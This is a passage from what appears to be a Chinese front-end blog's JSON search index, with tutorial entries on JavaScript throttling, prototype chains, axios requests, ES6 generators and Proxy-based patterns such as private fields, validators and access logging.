null，就可以再次点击了。\n对于延时执行函数来说的实现：清除定时器ID，如果是延迟调用就调用函数#\n\n二、节流throttle\n防抖动和节流本质是不一样的。防抖动是将多次执行变为最后一次执行，节流是将多次执行变成每隔一段时间执行\n\n如下图，持续触发scroll事件时，并不立即执行handle函数，每隔1000毫秒才会执行一次handle函数\n\n节流版本\n/** * underscore 节流函数，返回函数连续调用时，func 执行频率限定为 次 / wait * * @param  &#123;function&#125;   func      回调函数 * @param  &#123;number&#125;     wait      表示时间窗口的间隔 * @param  &#123;object&#125;     options   如果想忽略开始函数的的调用，传入&#123;leading: false&#125;。 *                                如果想忽略结尾函数的调用，传入&#123;trailing: false&#125; *                                两者不能共存，否则函数不能执行 * @return &#123;function&#125;             返回客户调用函数    */_.throttle = function(func, wait, options) &#123;    var context, args, result;    var timeout = null;    // 之前的时间戳    var previous = 0;    // 如果 options 没传则设为空对象    if (!options) options = &#123;&#125;;    // 定时器回调函数    var later = function() &#123;      // 如果设置了 leading，就将 previous 设为 0      // 用于下面函数的第一个 if 判断      previous = options.leading === false ? 0 : _.now();      // 置空一是为了防止内存泄漏，二是为了下面的定时器判断      timeout = null;      result = func.apply(context, args);      if (!timeout) context = args = null;    &#125;;    return function() &#123;      // 获得当前时间戳      var now = _.now();      // 首次进入前者肯定为 true\t  // 如果需要第一次不执行函数\t  // 就将上次时间戳设为当前的      // 这样在接下来计算 remaining 的值时会大于0      if (!previous &amp;&amp; options.leading === false) previous = now;      // 计算剩余时间      var remaining = wait - (now - previous);      context = this;      args = arguments;      // 如果当前调用已经大于上次调用时间 + wait      // 或者用户手动调了时间 \t  // 如果设置了 trailing，只会进入这个条件\t  // 如果没有设置 leading，那么第一次会进入这个条件\t  // 还有一点，你可能会觉得开启了定时器那么应该不会进入这个 if 条件了\t  // 其实还是会进入的，因为定时器的延时\t  // 并不是准确的时间，很可能你设置了2秒\t  // 但是他需要2.2秒才触发，这时候就会进入这个条件      if (remaining &lt;= 0 || remaining &gt; wait) &#123;        // 如果存在定时器就清理掉否则会调用二次回调        if (timeout) &#123;          clearTimeout(timeout);          timeout = null;        &#125;        previous = now;        result = func.apply(context, args);        if (!timeout) context = args = null;      &#125; else if (!timeout &amp;&amp; options.trailing !== false) &#123;        // 判断是否设置了定时器和 trailing\t    // 没有的话就开启一个定时器        // 并且不能不能同时设置 leading 和 trailing        timeout = setTimeout(later, remaining);      &#125;      return result;    &#125;;&#125;;","categories":["前端"],"tags":["javascript"]},{"title":"js-原型链","url":"/2018/03/18/html+css+js+ts/3-%E5%8E%9F%E5%9E%8B%E9%93%BE/","content":"一、JS内置对象\n所谓的内置对象 指的是：JavaScript本身就自己有的对象 可以直接拿来就用。例如Array String 等等。JavaScript一共有12内置对象\n\n函数类型(10个)\n\nString\nNumber\nBoolean\nArray\nFunction\nDate\nRegExp\nError\nObject\nEvent\n\n\n函数类型 有 __proto__和 prototype 属性\n\n对象类型(2个)\n\nMath\nJSON\n\n\n对象类型只有__proto__属性\n\n\n二、JS原型链2.1 概述\n\n每个函数都有 prototype 属性，除了 Function.prototype.bind()，该属性指向原型。\n每个对象都有 __proto__ 属性，指向了创建该对象的构造函数的原型。其实这个属性指向了 [[prototype]]，但是 [[prototype]] 是内部属性，我们并不能访问到，所以使用 __proto__ 来访问\n对象可以通过 proto 来寻找不属于该对象的属性，__proto__ 将对象连接起来组成了原型链\n\n\n打开浏览器的控制面板，随便输入一个JS内置的构造器函数，比如Array，控制台输出的是一个名为Array的函数体，这好像并没有什么稀奇的，但是，当你接着输入Array.prototype，控制面板输出了一堆我们经常用到的Array构造器的方法，把目光转移到最下方，有一个叫__proto__的属性，好奇的点开。列表列出的不是Object构造器的方法么，里边有我们非常熟悉的hasOwnProperty还有toString等方法。如果Array是构造器，那么控制面板输出的Array.prototype的所有属性中constructor又是什么构造器？点开看看，之后就像身处德罗斯特效应中一样，__proto__和constructor，还有Array构造器中常用的方法名不断的出现，一层套一层，一层层展开，没有尽头\n\n\n\n拿Array举例，Array.prototype中有一个constructor属性，这个属性的值就是Array构造器自己\n\nArray.prototype.constructor === Array //true\n\n2.2 prototype\n这是一个显式原型属性，只有函数才拥有该属性。基本上所有函数都有这个属性，但是也有一个例外\n\nlet fun = Function.prototype.bind()\n\n\n如果你以上述方法创建一个函数，那么可以发现这个函数是不具有 prototype 属性的\n\n2.2.1 prototype 如何产生的\n当我们声明一个函数时，这个属性就被自动创建了\n\nfunction Foo() &#123;&#125;\n\n\n并且这个属性的值是一个对象（也就是原型），只有一个属性 constructor\n\n\nconstructor 对应着构造函数，也就是 Foo\n\n2.2.2 constructor\nconstructor是一个公有且不可枚举的属性。一旦我们改变了函数的 prototype ，那么新对象就没有这个属性了（当然可以通过原型链取到 constructor）\n\n那么你肯定也有一个疑问，这个属性到底有什么用呢？其实这个属性可以说是一个历史遗留问题，在大部分情况下是没用的，在我的理解里，我认为他有两个作用：\n\n让实例对象知道是什么函数构造了它\n如果想给某些类库中的构造函数增加一些自定义的方法，就可以通过 xx.constructor.method 来扩展\n\n2.3 __proto__\n这是每个对象都有的隐式原型属性，指向了创建该对象的构造函数的原型。其实这个属性指向了 [[prototype]]，但是 [[prototype]] 是内部属性，我们并不能访问到，所以使用 __proto__ 来访问\n\n\n因为在 JS 中是没有类的概念的，为了实现类似继承的方式，通过 __proto__ 将对象和原型联系起来组成原型链，得以让对象可以访问到不属于自己的属性\n\n2.3.1 实例对象的 _proto_ 如何产生的\n当我们使用 new 操作符时，生成的实例对象拥有了 __proto__属性\n\nfunction Foo() &#123;&#125;// 这个函数是 Function 的实例对象// function 就是一个语法糖// 内部调用了 new Function(...)\n\n\n所以可以说，在 new 的过程中，新对象被添加了 __proto__ 并且链接到构造函数的原型上\n\n2.3.2 new 的过程\n新生成了一个对象\n链接到原型\n绑定 this\n返回新对象\n\n\n在调用 new 的过程中会发生以上四件事情，我们也可以试着来自己实现一个 new\n\nfunction create() &#123;    // 创建一个空的对象    let obj = new Object()    // 获得构造函数    let Con = [].shift.call(arguments)    // 链接到原型\tobj.__proto__ = Con.prototype    // 绑定 this，执行构造函数    let result = Con.apply(obj, arguments)    // 确保 new 出来的是个对象    return typeof result === &#x27;object&#x27; ? result : obj&#125;\n\n\n对于实例对象来说，都是通过 new 产生的，无论是 function Foo() 还是 let a = &#123; b : 1 &#125;\n对于创建一个对象来说，更推荐使用字面量的方式创建对象。因为你使用 new Object()的方式创建对象需要通过作用域链一层层找到 Object，但是你使用字面量的方式就没这个问题。\n\n// function 就是个语法糖// 内部等同于 new Function()let a = &#123; b: 1 &#125;// 这个字面量内部也是使用了 new Object()\n\n\n\n这里Array 内置对象 且是函数类型。所以Array有__proto__属性 指向的是函数类型 (function（）&#123;&#125;)。所以当我们在输出Array.__proto__.proto__;就会返回对象类型(Object&#123;&#125;).但是再向上就null。因为Object就是父类了。所有的继承自Object。\n\n\nJS内置构造器其中之一的Array原本就是一个函数，而这个函数就是Function的prototype，所以Function.prototype有的方法，JS内置构造器都有，比如call()、apply()、bind()等（其实我们自定义的函数也是继承自Function.prototype，所以我们自己也可以定义构造器）。而Function.prototype的进化链指针又指向了Object.prototype\n\n// 数组实例的__proto__指向构造器的原型[].__proto__ === Array.prototype\n\n2.4 总结\nObject 是所有对象的爸爸，所有对象都可以通过 __proto__ 找到它\nFunction 是所有函数的爸爸，所有函数都可以通过 __proto__ 找到它\nFunction.prototype 和 Object.prototype 是两个特殊的对象，他们由引擎来创建\n除了以上两个特殊对象，其他对象都是通过构造器 new 出来的\n函数的 prototype 是一个对象，也就是原型\n对象的 __proto__ 指向原型， __proto__将对象和原型连接起来组成了原型链\n\n关于原型有3个相关的概念:\n\n函数对象的prototype属性, 可以称之为显式原型属性(简称: 显式原型)\n实例对象的__proto__属性, 可以称之为隐式原型属性(简称: 隐式原型)\n原型对象: 也就是prototype属性和_proto__属性指向的对象\n\n\n\n图中由相互关联的原型组成的链状结构就是原型链，也就是蓝色的这条线\n\n三、JSON和Math\nJS内置的构造器函数都可以使用new关键字实例化一个对象，我们称实例化后的这个对象就是某某构造器的一个实例\n\n\n\n我们试试JSON 和Math 能不能实例化对象\n\n\n\nJSON和Math不是构造器函数，他们是普通的对象。只有构造器函数才能使用new关键字实例化一个对象，而JSON和Math已经是对象了，所以我们可以不用实例化直接使用JSON和Math中的属性和方法\n\n\n所以JSON和Math不属于10个构造器函数，但他们12个共同属于Javascript的内置对象\n\n四、更多参考\nJavaScript深入之从原型到原型链\n\n","categories":["前端"],"tags":["javascript"]},{"title":"异步-axios","url":"/2018/03/16/html+css+js+ts/3-%E5%BC%82%E6%AD%A5-axios/","content":"一、axios 简介\naxios 是一个基于Promise用于浏览器和 nodejs 的 HTTP 客户端，它本身具有以下特征：\n\n\n从浏览器中创建 XMLHttpRequest\n从 node.js 发出 http 请求\n支持Promise API\n拦截请求和响应\n转换请求和响应数据\n取消请求\n自动转换JSON数据\n客户端支持防止CSRF/XSRF\n\n二、axios基础\naxios.request（config）\naxios.get（url [，config]）\naxios.delete（url [，config]）\naxios.head（url [，config]）\naxios.options（url [，config]）\naxios.post（url [，data [，config]]）\naxios.put（url [，data [，config]]）\naxios.patch（url [，data [，config]]）\n\n三、执行 GET 请求// 向具有指定ID的用户发出请求axios.get(&#x27;/user?ID=12345&#x27;).then(function (res) &#123;    console.log(res);&#125;).catch(function (error) &#123;    console.log(error);&#125;); // 也可以通过 params 对象传递参数axios.get(&#x27;/user&#x27;, &#123;    params: &#123;        ID: 12345    &#125;&#125;).then(function (response) &#123;    console.log(response);&#125;).catch(function (error) &#123;    console.log(error);&#125;);\n\n四、执行 POST 请求axios.post(&#x27;/user&#x27;, &#123;    userId:&quot;123&quot;&#125;,&#123;    headers:&#123;        token:&quot;abc&quot;    &#125;&#125;).then(function (res) &#123;    console.log(res);&#125;).catch(function (error) &#123;    console.log(error);&#125;);\n\n五、通过配置方式发送请求\nget请求是发送参数，在params中定义。而POST请求是发送request body,需要在data中定义\n\n// get 在params中定义axios(&#123;    url:&quot;pakage.json&quot;,    method:&quot;get&quot;,    params:&#123;        userId:&quot;123&quot;    &#125;,    headers:&#123;        token:&quot;http-test&quot;    &#125;&#125;).then(res=&gt;&#123;    console.log(res.data);&#125;)// post 在data中定义axios(&#123;    url:&quot;pakage.json&quot;,    method:&quot;post&quot;,    data:&#123;        userId:&quot;123&quot;    &#125;,    headers:&#123;        token:&quot;http-test&quot;    &#125;&#125;).then(res=&gt;&#123;    console.log(res.data);&#125;)\n\n六、执行多个并发请求function getUserAcount()&#123;    // 返回一个promise对象    return axios.get(&quot;/user/1234&quot;);&#125;function getUserPermissions()&#123;    // 返回一个promise对象    return axios.get(&quot;/user/1234/getUserPermissions&quot;);&#125;//一次性返回两个接口axios.all([getUserAccount(),getUserPerssions()]).then(axios.spread((acct, perms) =&gt; &#123;    // spread展开两个返回的结果    //两个请求现已完成&#125;))\n\n七、在react的应用\n组件首次“挂载”（mount）时，该方法就会执行。在组件生命周期中，该方法只会执行一次\n\ncomponentDidMount() &#123;    axios.get(`http://www.reddit.com/r/$&#123;this.props.subreddit&#125;.json`)      .then(res =&gt; &#123;        const posts = res.data.data.children.map(obj =&gt; obj.data);        this.setState(&#123; posts &#125;);      &#125;);  &#125;\n\n八、参考\nhttps://github.com/axios/axios\n\n","categories":["前端"],"tags":["javascript"]},{"title":"ES6 Generator","url":"/2018/04/01/html+css+js+ts/4-Generator/","content":"一、什么是Generator 函数1.1 语法\n学习 Generator 语法，你需要了解function* 、yield、next三个基本概念。\n\n\nfunction* 用来声明一个函数是生成器函数，它比普通的函数声明多了一个*,*的位置比较随意可以挨着 function 关键字，也可以挨着函数名\nyield 产出的意思，这个关键字只能出现在生成器函数体内，但是生成器中也可以没有yield 关键字，函数遇到 yield 的时候会暂停，并把 yield 后面的表达式结果抛出去\nnext作用是将代码的控制权交还给生成器函数\n\n// 声明生成器函数function* generator() &#123;    // A    yield &#x27;foo&#x27;    // B&#125;// 获取生成器对象let g = generator();// 第一个 next()，首次启动生成器g.next(); // &#123;value: &quot;foo&quot;, done: false&#125;// 唤醒被 yield 暂停的状态g.next();// &#123;value: undefined, done: true&#125;\n\n1.2 过程分析// 分析一个简单例子function* helloGenerator() &#123;   yield &quot;hello&quot;;   yield &quot;generator&quot;;   return;&#125;var h = helloGenerator();console.log(h.next());//&#123; value: &#x27;hello&#x27;, done: false &#125;console.log(h.next());//&#123; value: &#x27;generator&#x27;, done: false &#125;console.log(h.next());//&#123; value: &#x27;undefined&#x27;, done: true &#125;\n\n\n创建了h对象，指向helloGenerator的句柄\n第一次调用next()，执行到&quot;yield hello&quot;，暂缓执行,并返回了&quot;hello&quot;\n第二次调用next()，继续上一次的执行，执行到&quot;yield generator&quot;,暂缓执行，并返回了&quot;generator&quot;。\n第三次调用next(),直接执行return，并返回done:true，表明结束\n\n\n经过上面的分析，yield实际就是暂缓执行的标示，每执行一次next()，相当于指针移动到下一个yield位置\n\n\n总结一下，Generator函数是ES6提供的一种异步编程解决方案。通过yield标识位和next()方法调用，实现函数的分段执行\n1.3 yield 表达式\nyield是Generator函数的暂缓执行的标识，对于yield只能配合Generator函数使用，在普通的函数中使用会报错\n\nGenerator函数中还有一种yield*这个表达方式\nfunction* foo()&#123;   \tyield &quot;a&quot;;   \tyield &quot;b&quot;;   &#125;   function* gen(x,y)&#123;   \t  yield 1;   \t  yield 2;   \t  yield* foo();   \t  yield 3;   &#125;   var g = gen();   console.log(g.next());//&#123;value: 1, done: false&#125;   console.log(g.next());//&#123;value: 2, done: false&#125;   console.log(g.next());//&#123;value: &quot;a&quot;, done: true&#125;   console.log(g.next());//&#123;value: &quot;b&quot;, done: true&#125;   console.log(g.next());//&#123;value: &quot;3&quot;, done: true&#125;\n\n\n当执行yield*时，实际是遍历后面的Generator函数，等价于下面的写法：\n\nfunction* foo()&#123;   \tyield &quot;a&quot;;   \tyield &quot;b&quot;;&#125;function* gen(x,y)&#123;    yield 1;    yield 2;        for(var value of foo())&#123;      yield value;    &#125;        yield 3;&#125;\n\n注意：yield 后面只能适配Generator函数\n二、Generator应用场景2.1 异步操作的同步化表达\nGenerator函数的暂停执行的效果，意味着可以把异步操作写在yield表达式里面，等到调用next方法时再往后执行。这实际上等同于不需要写回调函数了，因为异步操作的后续操作可以放在yield表达式下面，反正要等到调用next方法时再执行。所以，Generator函数的一个重要实际意义就是用来处理异步操作，改写回调函数\n\nfunction* loadUI() &#123;  showLoadingScreen();  yield loadUIDataAsynchronously();  hideLoadingScreen();&#125;var loader = loadUI();// 加载UIloader.next()// 卸载UIloader.next()\n\n\n上面代码中，第一次调用loadUI函数时，该函数不会执行，仅返回一个遍历器。下一次对该遍历器调用next方法，则会显示Loading界面，并且异步加载数据。等到数据加载完成，再一次使用next方法，则会隐藏Loading界面。可以看到，这种写法的好处是所有Loading界面的逻辑，都被封装在一个函数，按部就班非常清晰\n\n\n通过Generator函数部署Ajax操作，可以用同步的方式表达。\n\nfunction* main() &#123;  var result = yield request(&quot;http://some.url&quot;);  var resp = JSON.parse(result);    console.log(resp.value);&#125;function request(url) &#123;  makeAjaxCall(url, function(response)&#123;    it.next(response);  &#125;);&#125;var it = main();it.next();\n\n2.2 控制流管理// 异步函数function getDataAsync (url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;            var res = &#123;                url: url,                data: Math.random()            &#125;            resolve(res)        &#125;, 1000)    &#125;)&#125;\n\n\n使用 Generator 函数可以这样写\n\nfunction * getData () &#123;    var res1 = yield getDataAsync(&#x27;/page/1?param=123&#x27;)    console.log(res1)    var res2 = yield getDataAsync(`/page/2?param=$&#123;res1.data&#125;`)    console.log(res2)    var res3 = yield getDataAsync(`/page/2?param=$&#123;res2.data&#125;`)    console.log(res3))&#125;\n\n\n然后我们这样逐步执行\n\nvar g = getData()g.next().value.then(res1 =&gt; &#123;    g.next(res1).value.then(res2 =&gt; &#123;        g.next(res2).value.then(() =&gt; &#123;            g.next()        &#125;)    &#125;)&#125;)\n\n\n上面的代码，我们逐步调用遍历器的 next()方法，由于每一个 next() 方法返回值的 value 属性为一个 Promise 对象，所以我们为其添加 then方法， 在 then 方法里面接着运行 next 方法挪移遍历器指针，直到 Generator 函数运行完成，实际上，这个过程我们不必手动完成，可以封装成一个简单的执行器\n\nfunction run (gen) &#123;    var g = gen()    function next (data) &#123;        var res = g.next(data)        if (res.done) return res.value        res.value.then((data) =&gt; &#123;            next(data)        &#125;)    &#125;    next()&#125;\n\n\nrun方法用来自动运行异步的 Generator 函数，其实就是一个递归的过程调用的过程。这样我们就不必手动执行 Generator 函数了。 有了 run 方法，我们只需要这样运行 getData 方法\n\nrun(getData)\n\n\n这样，我们就可以把异步操作封装到 Generator 函数内部，使用 run方法作为 Generator 函数的自执行器，来处理异步。其实我们不难发现， async/await 方法相比于 Generator 处理异步的方式，有很多相似的地方，只不过 async&#x2F;await 在语义化方面更加明显，同时 async/await 不需要我们手写执行器，其内部已经帮我们封装好了，这就是为什么说 async/await是 Generator函数处理异步的语法糖了\n\n2.3 部署 Iterator 接口\n利用 Generator 函数，可以在任意对象上部署 Iterator 接口。\n\nfunction* iterEntries(obj) &#123;  let keys = Object.keys(obj);  for (let i=0; i &lt; keys.length; i++) &#123;    let key = keys[i];    yield [key, obj[key]];  &#125;&#125;let myObj = &#123; foo: 3, bar: 7 &#125;;for (let [key, value] of iterEntries(myObj)) &#123;  console.log(key, value);&#125;// foo 3// bar 7\n\n\n上述代码中，myObj是一个普通对象，通过iterEntries函数，就有了 Iterator 接口。也就是说，可以在任意对象上部署next方法\n\n// 下面是一个对数组部署 Iterator 接口的例子，尽管数组原生具有这个接口function* makeSimpleGenerator(array)&#123;  var nextIndex = 0;  while(nextIndex &lt; array.length)&#123;    yield array[nextIndex++];  &#125;&#125;var gen = makeSimpleGenerator([&#x27;yo&#x27;, &#x27;ya&#x27;]);gen.next().value // &#x27;yo&#x27;gen.next().value // &#x27;ya&#x27;gen.next().done  // true\n","categories":["前端"],"tags":["es6"]},{"title":"ES6 Proxy","url":"/2018/04/05/html+css+js+ts/4-Proxy/","content":"一、proxy概述Proxy的兼容性\n\n\nproxy在目标对象的外层搭建了一层拦截，外界对目标对象的某些操作，必须通过这层拦截\n\nvar proxy = new Proxy(target, handler);\n\n\nnew Proxy()表示生成一个Proxy实例，target参数表示所要拦截的目标对象，handler参数也是一个对象，用来定制拦截行为\n\nvar target = &#123;   name: &#x27;poetries&#x27; &#125;; var logHandler = &#123;   get: function(target, key) &#123;     console.log(`$&#123;key&#125; 被读取`);     return target[key];   &#125;,   set: function(target, key, value) &#123;     console.log(`$&#123;key&#125; 被设置为 $&#123;value&#125;`);     target[key] = value;   &#125; &#125; var targetWithLog = new Proxy(target, logHandler);  targetWithLog.name; // 控制台输出：name 被读取 targetWithLog.name = &#x27;others&#x27;; // 控制台输出：name 被设置为 others  console.log(target.name); // 控制台输出: others\n\n\ntargetWithLog 读取属性的值时，实际上执行的是 logHandler.get ：在控制台输出信息，并且读取被代理对象 target 的属性。\n在 targetWithLog 设置属性值时，实际上执行的是 logHandler.set ：在控制台输出信息，并且设置被代理对象 target 的属性的值\n\n// 由于拦截函数总是返回35，所以访问任何属性都得到35var proxy = new Proxy(&#123;&#125;, &#123;  get: function(target, property) &#123;    return 35;  &#125;&#125;);proxy.time // 35proxy.name // 35proxy.title // 35\n\nProxy 实例也可以作为其他对象的原型对象\nvar proxy = new Proxy(&#123;&#125;, &#123;  get: function(target, property) &#123;    return 35;  &#125;&#125;);let obj = Object.create(proxy);obj.time // 35\n\n\nproxy对象是obj对象的原型，obj对象本身并没有time属性，所以根据原型链，会在proxy对象上读取该属性，导致被拦截\n\nProxy的作用\n\n对于代理模式 Proxy 的作用主要体现在三个方面\n\n\n拦截和监视外部对对象的访问\n降低函数或类的复杂度\n在复杂操作前对操作进行校验或对所需资源进行管理\n\n二、Proxy所能代理的范围–handler\n实际上 handler 本身就是ES6所新设计的一个对象.它的作用就是用来 自定义代理对象的各种可代理操作 。它本身一共有13中方法,每种方法都可以代理一种操作.其13种方法如下\n\n// 在读取代理对象的原型时触发该操作，比如在执行 Object.getPrototypeOf(proxy) 时。handler.getPrototypeOf()// 在设置代理对象的原型时触发该操作，比如在执行 Object.setPrototypeOf(proxy, null) 时。handler.setPrototypeOf() // 在判断一个代理对象是否是可扩展时触发该操作，比如在执行 Object.isExtensible(proxy) 时。handler.isExtensible() // 在让一个代理对象不可扩展时触发该操作，比如在执行 Object.preventExtensions(proxy) 时。handler.preventExtensions()// 在获取代理对象某个属性的属性描述时触发该操作，比如在执行 Object.getOwnPropertyDescriptor(proxy, &quot;foo&quot;) 时。handler.getOwnPropertyDescriptor() // 在定义代理对象某个属性时的属性描述时触发该操作，比如在执行 Object.defineProperty(proxy, &quot;foo&quot;, &#123;&#125;) 时。andler.defineProperty() // 在判断代理对象是否拥有某个属性时触发该操作，比如在执行 &quot;foo&quot; in proxy 时。handler.has()// 在读取代理对象的某个属性时触发该操作，比如在执行 proxy.foo 时。handler.get() // 在给代理对象的某个属性赋值时触发该操作，比如在执行 proxy.foo = 1 时。handler.set()// 在删除代理对象的某个属性时触发该操作，比如在执行 delete proxy.foo 时。handler.deleteProperty()// 在获取代理对象的所有属性键时触发该操作，比如在执行 Object.getOwnPropertyNames(proxy) 时。handler.ownKeys()// 在调用一个目标对象为函数的代理对象时触发该操作，比如在执行 proxy() 时。handler.apply() // 在给一个目标对象为构造函数的代理对象构造实例时触发该操作，比如在执行new proxy() 时。handler.construct()\n\n三、Proxy场景3.1 实现私有变量var target = &#123;   name: &#x27;poetries&#x27;,   _age: 22&#125;var logHandler = &#123;  get: function(target,key)&#123;    if(key.startsWith(&#x27;_&#x27;))&#123;      console.log(&#x27;私有变量age不能被访问&#x27;)      return false    &#125;    return target[key];  &#125;,  set: function(target, key, value) &#123;     if(key.startsWith(&#x27;_&#x27;))&#123;      console.log(&#x27;私有变量age不能被修改&#x27;)      return false    &#125;     target[key] = value;   &#125;&#125; var targetWithLog = new Proxy(target, logHandler); // 私有变量age不能被访问targetWithLog.name;  // 私有变量age不能被修改targetWithLog.name = &#x27;others&#x27;;\n\n\n在下面的代码中，我们声明了一个私有的 apiKey，便于 api 这个对象内部的方法调用，但不希望从外部也能够访问 api._apiKey\n\nvar api = &#123;      _apiKey: &#x27;123abc456def&#x27;,    /* mock methods that use this._apiKey */    getUsers: function()&#123;&#125;,     getUser: function(userId)&#123;&#125;,     setUser: function(userId, config)&#123;&#125;&#125;;// logs &#x27;123abc456def&#x27;;console.log(&quot;An apiKey we want to keep private&quot;, api._apiKey);// get and mutate _apiKeys as desiredvar apiKey = api._apiKey;  api._apiKey = &#x27;987654321&#x27;;\n\n\n很显然，约定俗成是没有束缚力的。使用 ES6 Proxy 我们就可以实现真实的私有变量了，下面针对不同的读取方式演示两个不同的私有化方法。第一种方法是使用 set / get 拦截读写请求并返回 undefined:\n\nlet api = &#123;      _apiKey: &#x27;123abc456def&#x27;,    getUsers: function()&#123; &#125;,     getUser: function(userId)&#123; &#125;,     setUser: function(userId, config)&#123; &#125;&#125;;const RESTRICTED = [&#x27;_apiKey&#x27;];api = new Proxy(api, &#123;      get(target, key, proxy) &#123;        if(RESTRICTED.indexOf(key) &gt; -1) &#123;            throw Error(`$&#123;key&#125; is restricted. Please see api documentation for further info.`);        &#125;        return Reflect.get(target, key, proxy);    &#125;,    set(target, key, value, proxy) &#123;        if(RESTRICTED.indexOf(key) &gt; -1) &#123;            throw Error(`$&#123;key&#125; is restricted. Please see api documentation for further info.`);        &#125;        return Reflect.get(target, key, value, proxy);    &#125;&#125;);// 以下操作都会抛出错误console.log(api._apiKey);api._apiKey = &#x27;987654321&#x27;;\n\n\n第二种方法是使用 has 拦截 in 操作\n\nvar api = &#123;      _apiKey: &#x27;123abc456def&#x27;,    getUsers: function()&#123; &#125;,     getUser: function(userId)&#123; &#125;,     setUser: function(userId, config)&#123; &#125;&#125;;const RESTRICTED = [&#x27;_apiKey&#x27;];api = new Proxy(api, &#123;      has(target, key) &#123;        return (RESTRICTED.indexOf(key) &gt; -1) ?            false :            Reflect.has(target, key);    &#125;&#125;);// these log false, and `for in` iterators will ignore _apiKeyconsole.log(&quot;_apiKey&quot; in api);for (var key in api) &#123;      if (api.hasOwnProperty(key) &amp;&amp; key === &quot;_apiKey&quot;) &#123;        console.log(&quot;This will never be logged because the proxy obscures _apiKey...&quot;)    &#125;&#125;\n\n3.2 抽离校验模块\n让我们从一个简单的类型校验开始做起，这个示例演示了如何使用 Proxy 保障数据类型的准确性\n\nlet numericDataStore = &#123;      count: 0,    amount: 1234,    total: 14&#125;;numericDataStore = new Proxy(numericDataStore, &#123;      set(target, key, value, proxy) &#123;        if (typeof value !== &#x27;number&#x27;) &#123;            throw Error(&quot;Properties in numericDataStore can only be numbers&quot;);        &#125;        return Reflect.set(target, key, value, proxy);    &#125;&#125;);// 抛出错误，因为 &quot;foo&quot; 不是数值numericDataStore.count = &quot;foo&quot;;// 赋值成功numericDataStore.count = 333;\n\n\n如果要直接为对象的所有属性开发一个校验器可能很快就会让代码结构变得臃肿，使用 Proxy 则可以将校验器从核心逻辑分离出来自成一体\n\nfunction createValidator(target, validator) &#123;      return new Proxy(target, &#123;        _validator: validator,        set(target, key, value, proxy) &#123;            if (target.hasOwnProperty(key)) &#123;                let validator = this._validator[key];                if (!!validator(value)) &#123;                    return Reflect.set(target, key, value, proxy);                &#125; else &#123;                    throw Error(`Cannot set $&#123;key&#125; to $&#123;value&#125;. Invalid.`);                &#125;            &#125; else &#123;                throw Error(`$&#123;key&#125; is not a valid property`)            &#125;        &#125;    &#125;);&#125;const personValidators = &#123;      name(val) &#123;        return typeof val === &#x27;string&#x27;;    &#125;,    age(val) &#123;        return typeof age === &#x27;number&#x27; &amp;&amp; age &gt; 18;    &#125;&#125;class Person &#123;      constructor(name, age) &#123;        this.name = name;        this.age = age;        return createValidator(this, personValidators);    &#125;&#125;const bill = new Person(&#x27;Bill&#x27;, 25);// 以下操作都会报错bill.name = 0;  bill.age = &#x27;Bill&#x27;;  bill.age = 15;\n\n\n通过校验器和主逻辑的分离，你可以无限扩展 personValidators 校验器的内容，而不会对相关的类或函数造成直接破坏。更复杂一点，我们还可以使用 Proxy 模拟类型检查，检查函数是否接收了类型和数量都正确的参数\n\nlet obj = &#123;      pickyMethodOne: function(obj, str, num) &#123; /* ... */ &#125;,    pickyMethodTwo: function(num, obj) &#123; /*... */ &#125;&#125;;const argTypes = &#123;      pickyMethodOne: [&quot;object&quot;, &quot;string&quot;, &quot;number&quot;],    pickyMethodTwo: [&quot;number&quot;, &quot;object&quot;]&#125;;obj = new Proxy(obj, &#123;      get: function(target, key, proxy) &#123;        var value = target[key];        return function(...args) &#123;            var checkArgs = argChecker(key, args, argTypes[key]);            return Reflect.apply(value, target, args);        &#125;;    &#125;&#125;);function argChecker(name, args, checkers) &#123;      for (var idx = 0; idx &lt; args.length; idx++) &#123;        var arg = args[idx];        var type = checkers[idx];        if (!arg || typeof arg !== type) &#123;            console.warn(`You are incorrectly implementing the signature of $&#123;name&#125;. Check param $&#123;idx + 1&#125;`);        &#125;    &#125;&#125;obj.pickyMethodOne();  // &gt; You are incorrectly implementing the signature of pickyMethodOne. Check param 1// &gt; You are incorrectly implementing the signature of pickyMethodOne. Check param 2// &gt; You are incorrectly implementing the signature of pickyMethodOne. Check param 3obj.pickyMethodTwo(&quot;wopdopadoo&quot;, &#123;&#125;);  // &gt; You are incorrectly implementing the signature of pickyMethodTwo. Check param 1// No warnings loggedobj.pickyMethodOne(&#123;&#125;, &quot;a little string&quot;, 123);  obj.pickyMethodOne(123, &#123;&#125;);\n\n3.3 访问日志\n对于那些调用频繁、运行缓慢或占用执行环境资源较多的属性或接口，开发者会希望记录它们的使用情况或性能表现，这个时候就可以使用 Proxy 充当中间件的角色，轻而易举实现日志功能\n\nlet api = &#123;      _apiKey: &#x27;123abc456def&#x27;,    getUsers: function() &#123; /* ... */ &#125;,    getUser: function(userId) &#123; /* ... */ &#125;,    setUser: function(userId, config) &#123; /* ... */ &#125;&#125;;function logMethodAsync(timestamp, method) &#123;      setTimeout(function() &#123;        console.log(`$&#123;timestamp&#125; - Logging $&#123;method&#125; request asynchronously.`);    &#125;, 0)&#125;api = new Proxy(api, &#123;      get: function(target, key, proxy) &#123;        var value = target[key];        return function(...arguments) &#123;            logMethodAsync(new Date(), key);            return Reflect.apply(value, target, arguments);        &#125;;    &#125;&#125;);api.getUsers();\n\n3.4 预警和拦截\n假设你不想让其他开发者删除 noDelete 属性，还想让调用 oldMethod 的开发者了解到这个方法已经被废弃了，或者告诉开发者不要修改 doNotChange 属性，那么就可以使用 Proxy 来实现\n\nlet dataStore = &#123;      noDelete: 1235,    oldMethod: function() &#123;/*...*/ &#125;,    doNotChange: &quot;tried and true&quot;&#125;;const NODELETE = [&#x27;noDelete&#x27;];  const NOCHANGE = [&#x27;doNotChange&#x27;];const DEPRECATED = [&#x27;oldMethod&#x27;];  dataStore = new Proxy(dataStore, &#123;      set(target, key, value, proxy) &#123;        if (NOCHANGE.includes(key)) &#123;            throw Error(`Error! $&#123;key&#125; is immutable.`);        &#125;        return Reflect.set(target, key, value, proxy);    &#125;,    deleteProperty(target, key) &#123;        if (NODELETE.includes(key)) &#123;            throw Error(`Error! $&#123;key&#125; cannot be deleted.`);        &#125;        return Reflect.deleteProperty(target, key);    &#125;,    get(target, key, proxy) &#123;        if (DEPRECATED.includes(key)) &#123;            console.warn(`Warning! $&#123;key&#125; is deprecated.`);        &#125;        var val = target[key];        return typeof val === &#x27;function&#x27; ?            function(...args) &#123;                Reflect.apply(target[key], target, args);            &#125; :            val;    &#125;&#125;);// these will throw errors 